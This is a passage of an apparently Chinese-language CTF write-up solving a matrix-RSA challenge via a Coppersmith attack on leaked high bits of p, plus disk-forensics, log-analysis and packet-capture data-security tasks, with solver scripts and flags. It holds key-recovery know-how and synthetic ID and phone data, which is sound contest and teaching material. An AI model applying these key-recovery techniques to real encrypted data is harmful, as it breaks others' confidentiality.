<p>根据题目信息和形式，可以直接看出来是需要去做一个矩阵快速幂+已知p的高位求解</p>
<p>先求解pq，已知高位那就直接coppersmith。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009</span></span><br><span class="line">p4 =  <span class="number">9707529668721508094878754383636813058761407528950189013789315732447048631740849315894253576415843631107370002912949379757275</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line"><span class="built_in">print</span>(p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="keyword">if</span> roots:        </span><br><span class="line">    p = p4 + <span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">    q = n//p</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f'n: <span class="subst">{n}</span>'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f'p: <span class="subst">{p}</span>'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f'q: <span class="subst">{q}</span>'</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">n: 132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009</span></span><br><span class="line"><span class="string">p: 12305755811288164655681709252717258015229295989302934566212712319314835335461946241491177972870130171728224502716603340551354171940107285908105124549960063</span></span><br><span class="line"><span class="string">q: 10750967246621849802090386055921679114516122704252330881722100331526757637044067492444912824266860574267360247681890637480406758188129451052986858429875143</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<p>得知p和q的值之后，我们就可以利用矩阵上的欧拉函数来求解对应的d的值了，矩阵上的phi的求解方法可以在论文上搜到，其实在2024H&amp;NCTF就遇到过类似的题。具体如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line">p=<span class="number">12305755811288164655681709252717258015229295989302934566212712319314835335461946241491177972870130171728224502716603340551354171940107285908105124549960063</span></span><br><span class="line">q=<span class="number">10750967246621849802090386055921679114516122704252330881722100331526757637044067492444912824266860574267360247681890637480406758188129451052986858429875143</span></span><br><span class="line">n=<span class="number">132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009</span></span><br><span class="line">q=n//p</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">phi=(p**<span class="number">2</span>-<span class="number">1</span>)*(p**<span class="number">2</span>-p)*(q**<span class="number">2</span>-<span class="number">1</span>)*(q**<span class="number">2</span>-q)</span><br><span class="line">d=invert(e,phi)</span><br><span class="line">C = [(<span class="number">130700952989014311434434028098810412089294728270156705618326733322297465714495704072159530618655340096705383710304658044991149662060657745933090473082775425812641300964472543605460360640675949447837208449794830578184968528547366608180085787382376536622136035364815331037493098283462540849880674541138443271941</span>,<span class="number">71108771421281691064141020659106224750236412635914570166893031318860027728093402453305986361330527563506168063047627979831630830003190075818824767924892107148560048725155587353683119195901991465464478196049173060097561821877061015587704803006499153902855903286456023726638247758665778434728734461065079337757</span>,<span class="number">67999998657112350704927993584783146575182096185020115836188544590466205688442741039622382576899587857972463337900200038021257164640987281308471100297698062626107380871262596623736773815445544153508352926374272336154553916204320257697068627063236060520725376727528604938949588845448940836430120015498687885615</span>),(<span class="number">23893343854815011808020457237095285782125931083991537368666368653089096539223297567339111502968295914745423286070638369517207554770793304994639155083818859208362057394004419565231389473766857235749279110546079776040193183912062870294579472815588333047561915280189529367474392709554971446978468118280633281993</span>,<span class="number">9711323829269829751519177755915164402658693668631868499383945203627197171508441332211907278473276713066275283973856513580205808517918096017699122954464305556795300874005627001464297760413897074044080665941802588680926430030715299713241442313300920463145903399054123967914968894345491958980945927764454159601</span>,<span class="number">44904507975955275578858125671789564568591470104141872573541481508697254621798834910263012676346204850278744732796211742615531019931085695420000582627144871996018850098958417750918177991375489106531511894991744745328626887250694950153424439172667977623425955725695498585224383607063387876414273539268016177401</span>),(<span class="number">67805732998935098446255672500407441801838056284635701147853683333480924477835278030145327818330916280792499177503535618310624546400536573924729837478349680007368781306805363621196573313903080315513952415535369016620873765493531188596985587834408434835281527678166509365418905214174034794683785063802543354572</span>,<span class="number">13486048723056269216825615499052563411132892702727634833280269923882908676944418624902325737619945647093190397919828623788245644333036340084254490542292357044974139884304715033710988658109160936809398722070125690919829906642273377982021120160702344103998315875166038849942426382506293976662337161520494820727</span>,<span class="number">95932690738697024519546289135992512776877884741458439242887603021792409575448192508456813215486904392440772808083658410285088451086298418303987628634150431725794904656250453314950126433260613949819432633322599879072805834951478466009343397728711205498602927752917834774516505262381463414617797291857077444676</span>)]</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment">#43047629616720251859920881165918075023893933573825994519997852119693144034068228665675671008862068761689715575445863640329185530092254447033928598712851124933241259796000409454197098998799078885998056075500976415419186412399189184258784327330927609649434122305185189759743259787356570331002461440733304204342679095128737964168575795695943494599749806682478073567726561293885643247380288743798673732739109783483741538869058700456560293887763294510183730649166561156999855271107039762823109162450450948873519089591956760678722334804695337058632832722333717031908734519718095108861846032363515360975287686310685125011768433759743169949589954960109168003535788965458199549552102384437401599362854039593164761770413470916704699518414671776915866253494811160263070661525551825028432063886591059208936847333549443116179443061702501174393173108634281296467878611053210142532485402964658881743677593408270250687616341096196040338988333205100490703477191756842960478575393797412553786998150700948989806787001465881554867817322042204140650969096886474708640327780777812748503294416087248565587329831724663810705103426406635344978879191125281349704216611638879400671856857369494791947153176208756628137723497867840017302010032797105960559820801</span></span><br></pre></td></tr></table></figure>
<p>求出d之后，我们再矩阵快速幂算C^d次即可得到flag的各部分</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_matrix_multiply</span>(<span class="params">A, B, n</span>):</span><br><span class="line">    <span class="comment"># 在模 n 的有限域上计算矩阵乘法</span></span><br><span class="line">    C = np.dot(A, B) % n</span><br><span class="line">    <span class="keyword">return</span> C</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_matrix_power</span>(<span class="params">A, power, n</span>):</span><br><span class="line">    <span class="comment"># 计算矩阵 A 的幂</span></span><br><span class="line">    result = np.eye(<span class="built_in">len</span>(A), dtype=<span class="built_in">int</span>)  <span class="comment"># 创建单位矩阵</span></span><br><span class="line">    <span class="keyword">while</span> power &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> power % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            result = mod_matrix_multiply(result, A, n)</span><br><span class="line">        A = mod_matrix_multiply(A, A, n)</span><br><span class="line">        power //= <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">C = [(<span class="number">130700952989014311434434028098810412089294728270156705618326733322297465714495704072159530618655340096705383710304658044991149662060657745933090473082775425812641300964472543605460360640675949447837208449794830578184968528547366608180085787382376536622136035364815331037493098283462540849880674541138443271941</span>,<span class="number">71108771421281691064141020659106224750236412635914570166893031318860027728093402453305986361330527563506168063047627979831630830003190075818824767924892107148560048725155587353683119195901991465464478196049173060097561821877061015587704803006499153902855903286456023726638247758665778434728734461065079337757</span>,<span class="number">67999998657112350704927993584783146575182096185020115836188544590466205688442741039622382576899587857972463337900200038021257164640987281308471100297698062626107380871262596623736773815445544153508352926374272336154553916204320257697068627063236060520725376727528604938949588845448940836430120015498687885615</span>),(<span class="number">23893343854815011808020457237095285782125931083991537368666368653089096539223297567339111502968295914745423286070638369517207554770793304994639155083818859208362057394004419565231389473766857235749279110546079776040193183912062870294579472815588333047561915280189529367474392709554971446978468118280633281993</span>,<span class="number">9711323829269829751519177755915164402658693668631868499383945203627197171508441332211907278473276713066275283973856513580205808517918096017699122954464305556795300874005627001464297760413897074044080665941802588680926430030715299713241442313300920463145903399054123967914968894345491958980945927764454159601</span>,<span class="number">44904507975955275578858125671789564568591470104141872573541481508697254621798834910263012676346204850278744732796211742615531019931085695420000582627144871996018850098958417750918177991375489106531511894991744745328626887250694950153424439172667977623425955725695498585224383607063387876414273539268016177401</span>),(<span class="number">67805732998935098446255672500407441801838056284635701147853683333480924477835278030145327818330916280792499177503535618310624546400536573924729837478349680007368781306805363621196573313903080315513952415535369016620873765493531188596985587834408434835281527678166509365418905214174034794683785063802543354572</span>,<span class="number">13486048723056269216825615499052563411132892702727634833280269923882908676944418624902325737619945647093190397919828623788245644333036340084254490542292357044974139884304715033710988658109160936809398722070125690919829906642273377982021120160702344103998315875166038849942426382506293976662337161520494820727</span>,<span class="number">95932690738697024519546289135992512776877884741458439242887603021792409575448192508456813215486904392440772808083658410285088451086298418303987628634150431725794904656250453314950126433260613949819432633322599879072805834951478466009343397728711205498602927752917834774516505262381463414617797291857077444676</span>)]</span><br><span class="line"></span><br><span class="line">d=<span class="number">43047629616720251859920881165918075023893933573825994519997852119693144034068228665675671008862068761689715575445863640329185530092254447033928598712851124933241259796000409454197098998799078885998056075500976415419186412399189184258784327330927609649434122305185189759743259787356570331002461440733304204342679095128737964168575795695943494599749806682478073567726561293885643247380288743798673732739109783483741538869058700456560293887763294510183730649166561156999855271107039762823109162450450948873519089591956760678722334804695337058632832722333717031908734519718095108861846032363515360975287686310685125011768433759743169949589954960109168003535788965458199549552102384437401599362854039593164761770413470916704699518414671776915866253494811160263070661525551825028432063886591059208936847333549443116179443061702501174393173108634281296467878611053210142532485402964658881743677593408270250687616341096196040338988333205100490703477191756842960478575393797412553786998150700948989806787001465881554867817322042204140650969096886474708640327780777812748503294416087248565587329831724663810705103426406635344978879191125281349704216611638879400671856857369494791947153176208756628137723497867840017302010032797105960559820801</span></span><br><span class="line"><span class="built_in">print</span>(mod_matrix_power(C,d,n))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[[6537547124942896363556910284537979082270724861730448998#flag1</span></span><br><span class="line"><span class="string">  4922321730290670654923300376398270986600388494493121377#flag2</span></span><br><span class="line"><span class="string">  7875050823366674760074264670738469846743038549320754022]</span></span><br><span class="line"><span class="string"> [11881437197497587270801024560701872641095800502149666903</span></span><br><span class="line"><span class="string">  7108052949162680427522366598986786385855392560476464945</span></span><br><span class="line"><span class="string">  10473947150905785882178785731710621841892274865355840321]</span></span><br><span class="line"><span class="string"> [9617091766406860640816031598215594338237784858167441764</span></span><br><span class="line"><span class="string">  3097622505046341281563803128600372235582304064924953929</span></span><br><span class="line"><span class="string">  5119872974228642605667436257655922430927914019627757406]]</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<p>将前面三部分转字符后拼接起来即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a1=<span class="number">6537547124942896363556910284537979082270724861730448998</span></span><br><span class="line">a2=<span class="number">4922321730290670654923300376398270986600388494493121377</span></span><br><span class="line">a3=<span class="number">7875050823366674760074264670738469846743038549320754022</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(a1))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(a2))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(a3))</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p>DASCTF{48ccbfd88061d7ff3d5325148ec55d11}</p>
<h1 id="misc">Misc</h1>
<h2 id="糟糕的磁盘">糟糕的磁盘</h2>
<p>题目给我们了几个img镜像</p>
<p>首先，我们将这些文件挂载在disk-drill下</p>
<p><img src="/images/2025西湖论剑/9.png"></p>
<p>发现有两个文件，我们将其恢复，发现得到了一个key.png和一个secret文件</p>
<p>我们打开key.png来看一看，发现是一张照片</p>
<p><img src="/images/2025西湖论剑/10.png"></p>
<p>然后我们使用VeraCrypt工具，将我们的secret挂载在加密卷上，使用我们的key.png作为密钥，即可解密</p>
<p><img src="/images/2025西湖论剑/11.png"></p>
<p>发现我们成功将文件挂载在了H盘上。打开之后得到一个flag.txt文件</p>
<p><img src="/images/2025西湖论剑/12.png"></p>
<p>打开得到flag</p>
<p>DASCTF{R41D_4ND_D15K_M4573R}</p>
<h1 id="ds">DS</h1>
<h2 id="ds1">DS1</h2>
<p>error
log有大量16进制，全部提取出来，并且分析对应的eval代码是文件的上传</p>
<p><img src="/images/2025西湖论剑/13.png"></p>
<p><img src="/images/2025西湖论剑/14.png"></p>
<p>两处十六进制分别是一个图片和一个压缩包，压缩包里面有密码</p>
<p>图片是一个盲水印</p>
<p>我们使用WaterMark工具直接一把梭，选择盲水印提取，获得压缩包对应的密码pass：dataPersonPass123987</p>
<p><img src="/images/2025西湖论剑/15.png"></p>
<p>得到密码后，解压对应的文件夹，可以得到一个csv文件，里面存放着对应的sfz和手机号，我们只需要定位到张三的信息就可以了</p>
<p><img src="/images/2025西湖论剑/16.png"></p>
<p>得到flag</p>
<p>DASCTF{30601319731003117X_79159498824}</p>
<h2 id="ds2">DS2</h2>
<p>使用下面代码读取data.pcapng中的userid和data数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 pcapng 文件</span></span><br><span class="line">cap = pyshark.FileCapture(<span class="string">'data.pcapng'</span>, display_filter=<span class="string">'http.request'</span>, tshark_path=<span class="string">"E:/CTFWeb/Wireshark/tshark.exe"</span>)</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历每一个 HTTP 请求包</span></span><br><span class="line"><span class="keyword">for</span> packet <span class="keyword">in</span> cap:</span><br><span class="line">    <span class="comment"># 判断是否是 HTTP POST 请求</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'HTTP'</span> <span class="keyword">in</span> packet:</span><br><span class="line">        <span class="keyword">if</span> packet.http.request_method == <span class="string">'POST'</span>:</span><br><span class="line">            </span><br><span class="line">            username = <span class="string">""</span></span><br><span class="line">            name = <span class="string">""</span></span><br><span class="line">            idcard = <span class="string">""</span></span><br><span class="line">            phone = <span class="string">""</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 输出请求的 URL 和查询参数</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(packet.http, <span class="string">'host'</span>) <span class="keyword">and</span> <span class="built_in">hasattr</span>(packet.http, <span class="string">'request_uri_query_parameter'</span>):</span><br><span class="line">                username = packet.http.request_uri_query_parameter</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 输出 POST 数据</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(packet, <span class="string">'http'</span>) <span class="keyword">and</span> <span class="built_in">hasattr</span>(packet.http, <span class="string">'file_data'</span>):</span><br><span class="line">                post_data = packet.http.file_data</span><br><span class="line">                d = json.loads(post_data)</span><br><span class="line">                name = d[<span class="string">"name"</span>]</span><br><span class="line">                idcard = d[<span class="string">"idcard"</span>]</span><br><span class="line">                phone = d[<span class="string">"phone"</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"No POST data found."</span>)</span><br><span class="line">            </span><br><span class="line">            data.append({<span class="string">"username"</span>: username, <span class="string">"name"</span>: name, <span class="string">"idcard"</span>: idcard, <span class="string">"phone"</span>: phone})</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'-'</span>*<span class="number">50</span>)</span><br><span class="line">                        </span><br><span class="line">csv_file_path = <span class="string">'output.csv'</span></span><br><span class="line"><span class="comment"># 获取字典的字段名（即 CSV 文件的列名）</span></span><br><span class="line">fieldnames = data[<span class="number">0</span>].keys()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开文件并写入数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(csv_file_path, mode=<span class="string">'w'</span>, newline=<span class="string">''</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    writer = csv.DictWriter(file, fieldnames=fieldnames)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入表头</span></span><br><span class="line">    writer.writeheader()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入数据</span></span><br><span class="line">    writer.writerows(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"Data has been written to <span class="subst">{csv_file_path}</span>"</span>)</span><br></pre></td></tr></table></figure>
<p>读取完之后使用下面验证脚本对每个用户数据进行验证：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> dsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> DSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> DSS</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_public_key</span>(<span class="params">user_id</span>):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Load the public key from a PEM file based on the user_id.</span></span><br><span class="line"><span class="string">    The public key file is named in the format `public-XXXX.pem`, where XXXX is the user_id padded to 4 digits.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    filename = <span class="string">f'public/public-<span class="subst">{user_id:04d}</span>.pem'</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> key_file:</span><br><span class="line">        <span class="comment"># public_key = serialization.load_pem_public_key(</span></span><br><span class="line">        <span class="comment">#     key_file.read(),</span></span><br><span class="line">        <span class="comment">#     backend=default_backend()</span></span><br><span class="line">        <span class="comment"># )</span></span><br><span class="line">        public_key = key_file.read()</span><br><span class="line">    <span class="keyword">return</span> public_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_signature</span>(<span class="params">data, signature, user_id</span>):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Verify the DSA signature using the SHA256 hash of the data and the corresponding public key.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    public_key_pem = load_public_key(user_id)</span><br><span class="line">    public_key = DSA.import_key(public_key_pem)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Verify the signature using the public key</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> data.items():</span><br><span class="line">        message = SHA256.new(value.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        verifier = DSS.new(public_key, <span class="string">'fips-186-3'</span>)</span><br><span class="line">        signature_decoded = base64.b64decode(signature[key])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            verifier.verify(message, signature_decoded)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="comment"># print("Signature is invalid.")</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># print(f"Signature is valid.")</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">signatures = {}</span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'data-sign.csv'</span>, mode=<span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    reader = csv.reader(file)</span><br><span class="line">    <span class="built_in">next</span>(reader)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(row) != <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># Skip invalid rows</span></span><br><span class="line"></span><br><span class="line">        username, name_signature, idcard_signature, phone_signature = row</span><br><span class="line">        username = <span class="built_in">int</span>(username)</span><br><span class="line">        </span><br><span class="line">        signatures[username] = {<span class="string">"name"</span>: name_signature, <span class="string">"idcard"</span>: idcard_signature, <span class="string">"phone"</span>: phone_signature}</span><br><span class="line"></span><br><span class="line">        <span class="comment"># signature = bytes.fromhex(signature)  # Assuming signature is stored in hex format</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Verify the signature for the current user</span></span><br><span class="line">        <span class="comment"># verify_signature(data, signature, user_id)</span></span><br><span class="line"></span><br><span class="line">invalid_data = []</span><br><span class="line">duplicated = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'output.csv'</span>, mode=<span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    reader = csv.reader(file)</span><br><span class="line">    <span class="built_in">next</span>(reader)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(count)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        dp = <span class="string">''</span>.join(row)</span><br><span class="line">        <span class="keyword">if</span> dp <span class="keyword">in</span> duplicated:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            duplicated.add(dp)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(row) != <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># Skip invalid rows</span></span><br><span class="line"></span><br><span class="line">        username, name, idcard, phone = row</span><br><span class="line">        username = <span class="built_in">int</span>(username)</span><br><span class="line">        </span><br><span class="line">        data = {<span class="string">"name"</span>: name, <span class="string">"idcard"</span>: idcard, <span class="string">"phone"</span>: phone}</span><br><span class="line">        <span class="comment"># print(data, signatures[username])</span></span><br><span class="line">        is_valid = verify_signature(data, signatures[username], username)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_valid:</span><br><span class="line">            invalid_data.append({</span><br><span class="line">                <span class="string">"userid"</span>: username, </span><br><span class="line">                <span class="string">"name"</span>: name, </span><br><span class="line">                <span class="string">"idcard"</span>: idcard, </span><br><span class="line">                <span class="string">"phone"</span>: phone</span><br><span class="line">            })</span><br><span class="line">        <span class="comment"># break</span></span><br><span class="line"></span><br><span class="line">csv_file_path = <span class="string">'data.csv'</span></span><br><span class="line">fieldnames = invalid_data[<span class="number">0</span>].keys()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(csv_file_path, mode=<span class="string">'w'</span>, newline=<span class="string">''</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    writer = csv.DictWriter(file, fieldnames=fieldnames)</span><br><span class="line">    writer.writeheader()</span><br><span class="line">    writer.writerows(invalid_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"Data has been written to <span class="subst">{csv_file_path}</span>"</span>)</span><br></pre></td></tr></table></figure>
